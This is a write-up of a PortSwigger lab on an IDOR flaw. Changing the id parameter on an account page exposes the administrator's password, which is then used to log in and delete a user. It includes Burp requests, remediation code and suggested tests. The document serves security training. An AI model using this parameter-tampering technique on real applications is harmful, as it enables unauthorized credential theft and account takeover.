# User ID Controlled by Request Parameter with Password Disclosure  

**Category**: 01-Broken-Access-Control  
**Lab_ID**: IDOR-Password-Disclosure-001  
**Source**: PortSwigger  
**Date_Completed**: 2025-10-29  
**Tag**: `Broken-Access-Control`, `IDOR`, `Password-Disclosure`, `Horizontal-Privilege-Escalation`, `Admin-Access`  

---

## Executive summary

The application contains a horizontal privilege escalation vulnerability on the user account page, where the `id` parameter is client-controlled and not validated against the authenticated user's identity. The account page pre-fills the current user's password in a masked input, which is exposed when the `id` is changed to `administrator`. By logging in as `wiener:peter` and modifying the `id` parameter via Burp Suite, an attacker can retrieve the administrator's password. Using this password, the attacker can log in as the administrator and delete the user `carlos`. This demonstrates a severe Insecure Direct Object Reference (IDOR) vulnerability with critical data exposure.

**Result:** Logged in as `wiener` → changed `id=wiener` to `id=administrator` → retrieved administrator’s password → logged in as admin → deleted `carlos`.  
**Severity (subjective):** Critical — allows access to admin credentials and full control.  
**Recommended immediate action:** Enforce server-side authorization on the `id` parameter; remove password display from account pages.

---

## Objective

Exploit the access control vulnerability to retrieve the administrator's password and use it to delete the user `carlos`.

---

## Environment & tools

* Target: PortSwigger lab instance (Apprentice difficulty).  
* Tools: Modern browser, Burp Suite (Proxy, Repeater).  
* Notes: Credentials provided: `wiener:peter`. Admin username: `administrator`.

---

## Discovery (how the vulnerability was found)

1. Logged in using credentials `wiener:peter` and navigated to the account page (e.g., `GET /my-account?id=wiener`).  
2. Used **Burp Suite Proxy** to intercept the request.  
3. Sent the request to **Burp Repeater**.  
4. Modified the `id` parameter from `wiener` to `administrator`.  
5. Sent the modified request → observed the response contained the administrator’s password in the HTML (prefilled in a masked input).  
6. Logged in as `administrator` using the retrieved password and accessed the admin panel.

> Finding: The `id` parameter is not validated server-side, and the account page leaks the password for any user ID, including `administrator`.

---

## Reproduction steps (concise, non-sensitive)

1. Log in to the application using credentials `wiener:peter`.  
2. Navigate to the account page (e.g., `GET /my-account?id=wiener`).  
3. Use **Burp Suite Proxy** to intercept the request.  
4. Send the request to **Burp Repeater**.  
5. Modify the `id` parameter to `administrator` (e.g., `GET /my-account?id=administrator`).  
6. Send the request → inspect the response body to extract the administrator’s password from the masked input.  
7. Log out and log in as `administrator` using the retrieved password.  
8. Navigate to the admin panel, locate the user management section, and delete the user `carlos`.  
9. Verify deletion via lab completion.

**Captured Burp Suite HTTP interaction (actual exploitation):**

**Request (modified to administrator):**
```
GET /my-account?id=administrator HTTP/2
Host: <YOUR-LAB-ID>.web-security-academy.net
Cookie: session=<WIENER-SESSION-TOKEN>
Sec-Ch-Ua: "Google Chrome";v="141", "Not?A_Brand";v="8", "Chromium";v="141"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=0, i
```

**Response (illustrative, based on lab context):**
```
HTTP/2 200 OK
Content-Type: text/html
Content-Length: 1024

<html>
<body>
<form>
  <input type="password" name="current-password" value="admin_password_here" readonly>
  <!-- Other HTML content -->
</form>
</body>
</html>
```

> Note: The exact password field name and value (`admin_password_here`) may vary; extract from the response.

**Admin login and delete request (illustrative):**
```
POST /login HTTP/1.1
Host: <YOUR-LAB-ID>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=administrator&password=admin_password_here

GET /admin/delete?username=carlos HTTP/1.1
Host: <YOUR-LAB-ID>.web-security-academy.net
Cookie: session=<ADMIN-SESSION-TOKEN>
// Response confirms carlos deletion
```

---

## Observed impact

* Authenticated user can access the administrator’s password, enabling full admin privileges.  
* Successful deletion of `carlos` account.  
* Potential for: account takeover, data modification, system compromise via admin access.  
* Affects confidentiality and integrity due to password exposure.

---

## Root cause analysis

* **Primary cause:** The server does not validate the `id` parameter against the authenticated user’s identity, allowing access to any user’s account page.  
* **Secondary cause / contributing factor:** The account page pre-fills and exposes the password in a masked input, which is included in the response for unauthorized `id` values.

---

## Risk assessment

* **Likelihood:** High — the `id` parameter is easily modifiable, and the vulnerability is exploitable with basic tools like Burp.  
* **Impact**: Critical — exposure of admin credentials allows full system control.  
* **Overall risk**: Critical.  
  Optionally map to CVSS: **Critical** range (e.g., CVSS base score ~9.0–10.0) due to admin privilege escalation.

---

## Remediation (recommended, prioritized)

### Immediate / short-term (apply within hours)

1. Remove password display from the account page response.  
2. Return `403 Forbidden` if the `id` does not match the session user.

### Medium-term (apply within days)

1. **Enforce server-side authorization**: Validate `id` against the logged-in user’s identity.  
   ```python
   if request.args.get('id') != current_user.id:
       abort(403)
   ```
2. Use a secure password management flow (e.g., prompt for current password on update, never prefill).  
3. Implement input validation to restrict `id` to the session user.  
4. Add CSRF protection for account page requests.

### Long-term / defensive controls

1. Use role-based access control (RBAC) to limit data visibility.  
2. Add audit logging for account page access with mismatched IDs.  
3. Monitor for suspicious `id` parameter changes or password-related leaks.  
4. Add automated tests to detect password exposure in responses.  
5. Conduct regular access control and data sanitization reviews.

---

## Detection & verification guidance (for devs / QA / security teams)

* Test the account page with `id` set to another user’s ID → must return `403` with no password data.  
* Verify no password fields are prefilled or exposed in responses.  
* Use Burp Suite to manipulate `id` and inspect response bodies.  
* Scan code for password handling in HTML outputs.  
* Add CI test:  
  ```bash
  curl -b "session=wiener" "/my-account?id=administrator" → expect 403, no password
  ```

---

## Suggested tests to add

* Integration test: `GET /my-account?id=otheruser` → `403` with no password.  
* Security test: Non-admin cannot access peer user passwords via `id`.  
* Password test: Account page never includes password in response.  
* Logging test: Unauthorized `id` access attempts logged.  
* Fuzz test: Inject random `id` values → no sensitive data leakage.

---

## References & further reading

* OWASP Top Ten — Broken Access Control  
* OWASP Authorization Cheat Sheet  
* PortSwigger: Insecure Direct Object References (IDOR)  
* OWASP Password Storage Cheat Sheet  
* General guidance: Never expose passwords in responses; validate all user-controlled IDs.

---

## Notes & lessons learned

* **Passwords in responses are a critical flaw** — never prefill or leak them.  
* **IDOR with sensitive data** (e.g., passwords) escalates risk significantly.  
* **Burp Repeater is essential** for testing parameter tampering and response analysis.  
* **Admin access is a high-value target** — protect with strict controls.  
* Assume attackers will exploit any exposed credential.

---

## Evidence & validation (for lab record)

* Original URL: `/my-account?id=wiener` → shows `wiener`’s data (password masked).  
* Modified URL: `/my-account?id=administrator` → exposes administrator’s password.
<img width="710" height="336" alt="Screenshot 2025-10-29 181048" src="https://github.com/user-attachments/assets/1a848edb-1dfe-430b-aff8-e2676a119e5e" />
* Logged in as `administrator` → deleted `carlos` → lab completed.
* <img width="959" height="380" alt="Screenshot 2025-10-29 181025" src="https://github.com/user-attachments/assets/48dfe787-039b-4cf0-a2b2-f525b76cecfa" />

---

> **Legal & ethical reminder:** This writeup documents testing performed in a controlled PortSwigger lab environment. Do not apply these techniques to real systems without explicit authorization.
